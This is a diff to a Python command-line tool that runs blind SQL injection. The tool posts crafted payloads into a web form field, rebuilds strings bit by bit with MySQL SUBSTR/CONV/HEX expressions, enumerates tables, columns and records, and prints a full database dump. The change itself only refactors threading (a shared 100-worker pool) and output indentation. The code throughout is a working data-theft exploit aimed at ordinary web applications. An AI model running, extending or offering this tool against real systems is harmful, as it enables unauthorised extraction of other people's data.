@@ -1,29 +1,28 @@
 #!/usr/bin/python3
 
-import urllib.parse, urllib.request, time, math, argparse, sys
-from concurrent.futures import *
+import urllib.parse, urllib.request, time, math, argparse, sys, concurrent.futures
+#from concurrent.futures import *
 
 DEFAULT_DELAY=0
 
 MAX_THREADS=100
-CURRENT_THREADS=1
+executor = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS)
 
 class Printer:
 
     def __init__(self, verbosity=0, outfile=None):
         self.verbosity = verbosity
         self.outfile = outfile
-        self.indent=0
 
-    def print(self, str, req_verbosity=0):
+    def print(self, str, req_verbosity=0, indent=0):
         if self.verbosity >= req_verbosity:
-            print(('\t'*self.indent)+str)
+            print(('\t'*indent)+str)
 
-    def printToFile(self, str):
+    def printToFile(self, str, indent=0):
         if self.outfile is None:
-            print(('\t'*self.indent)+str)
+            print(('\t'*indent)+str)
         else:
-            self.outfile.write(('\t'*self.indent)+str+'\n')
+            self.outfile.write(('\t'*indent)+str+'\n')
 
 
 
@@ -47,7 +46,6 @@ class Injector:
 
     def runInjection(self, inj):
         time.sleep(self.delay)
-        PRINTER.print('Injecting: %s' % inj, 3)
         data = self.other_fields.copy()
         data[self.attack_field] = inj
         res = self.post(data)
@@ -83,33 +81,19 @@ class Injector:
         return self.getNumber("LENGTH((%s))" % obj)
 
     def getChar(self, obj, index):
-        global MAX_THREADS, CURRENT_THREADS
-        numWorkers = max(min(7, MAX_THREADS-CURRENT_THREADS), 1)
-        CURRENT_THREADS += numWorkers
-        with ThreadPoolExecutor(max_workers=numWorkers) as executor:
-            binstr = ''.join(list(executor.map(
-                (lambda x: "1" if
-                 self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
-                               % (obj, index, x))
-                 else "0"), range(1, 8))))
-        CURRENT_THREADS -= numWorkers
+        binstr = ''.join(list(executor.map(
+            (lambda x: "1" if
+             self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
+                           % (obj, index, x))
+             else "0"), range(1, 8))))
         c = int(binstr, 2).to_bytes(15//8, 'big').decode()
-        PRINTER.print("Found character: %c" % c, 2)
         return c
 
     def getString(self, obj):
-        global MAX_THREADS, CURRENT_THREADS
-        PRINTER.print("Getting string length...", 2)
         namelen = self.getLen(obj)
-        PRINTER.print("Found string length of %d" % namelen, 2)
-        name = ""
-        numWorkers = max(min(namelen, MAX_THREADS-CURRENT_THREADS), 1)
-        CURRENT_THREADS += numWorkers
-        with ThreadPoolExecutor(max_workers=numWorkers) as executor:
-            name = ''.join(list(executor.map(
-                (lambda x: self.getChar(obj, x)),
-                range(1, namelen+1))))
-        CURRENT_THREADS -= numWorkers
+        name = ''.join(list(executor.map(
+            (lambda x: self.getChar(obj, x)),
+            range(1, namelen+1))))
         return name
 
     def getDataFromTable(self, column, table, index=0, where="1=1"):
@@ -160,15 +144,10 @@ class Database:
         self.tables.append(table)
         
     def findTables(self, populateTables=False):
-        global MAX_THREADS, CURRENT_THREADS
         PRINTER.print("Getting table count...", 1)
         count = self.getTableCount()
         PRINTER.print("Counted %d tables" % count, 1)
-        numWorkers = max(min(count, MAX_THREADS-CURRENT_THREADS), 1)
-        CURRENT_THREADS += numWorkers
-        with ThreadPoolExecutor(max_workers=numWorkers) as executor:
-            self.tables.extend(list(executor.map(lambda x: self.getTable(x, populateTables), range(count))))
-        CURRENT_THREADS -= numWorkers
+        self.tables.extend(list(executor.map(lambda x: self.getTable(x, populateTables), range(count))))
 
         
 
@@ -185,11 +164,9 @@ class Table:
         self.columns_table = columns_table
 
     def populate(self, where=None):
-        PRINTER.indent = 1
         self.findColumns()
         PRINTER.print("", 1)
         self.findRecords(where)
-        PRINTER.indent = 0
 
     def getColumnCount(self):
         if self.columns_table is not None:
@@ -204,12 +181,12 @@ class Table:
             return ''
 
     def findColumns(self):
-        PRINTER.print("Getting column count...", 1)
+        PRINTER.print("Getting column count...", 1, 1)
         count = self.getColumnCount()
-        PRINTER.print("Found %d columns" % count)
+        PRINTER.print("Found %d columns" % count, 1, 1)
         for i in range(count):
             name = self.getColumnName(i)
-            PRINTER.print("Got column name: %s" % name, 1)
+            PRINTER.print("Got column name: %s" % name, 1, 1)
             self.columns.append(name)
 
 
@@ -220,14 +197,14 @@ class Table:
         return self.injector.getDataFromTable(column, self, recordIndex, where)
 
     def findRecords(self, where=None):
-        PRINTER.print("Getting record count...", 1)
+        PRINTER.print("Getting record count...", 1, 1)
         count = self.getRecordCount(where)
-        PRINTER.print("Found %d records" % count)
+        PRINTER.print("Found %d records" % count, 1, 1)
         for i in range(count):
             record = Record(self)
             for col in self.columns:
                 data = self.getRecordData(i, col, where)
-                PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, i), 1)
+                PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, i), 1, 2)
                 record.setData(col, data)
             PRINTER.print("", 1)
             self.records.append(record)
@@ -335,7 +312,7 @@ class Parser:
 
 if __name__ == '__main__':
     p = Parser()
-
+    
     verbosity = 0 if p.args.verbose is None else p.args.verbose
     PRINTER = Printer(verbosity, p.args.outfile)
 
@@ -358,10 +335,10 @@ if __name__ == '__main__':
     PRINTER.printToFile("========== DATABASE DUMP ==========")
     for table in db.tables:
         PRINTER.printToFile("======= TABLE: %s.%s" % (table.schema, table.name))
-        PRINTER.indent = 1
         for record in table.records:
             for column, value in record.data.items():
-                PRINTER.printToFile("%s: %s" % (column, value))
+                PRINTER.printToFile("%s: %s" % (column, value), 1)
             PRINTER.printToFile("")
         PRINTER.printToFile("")
-        PRINTER.indent = 0
+
+executor.shutdown()
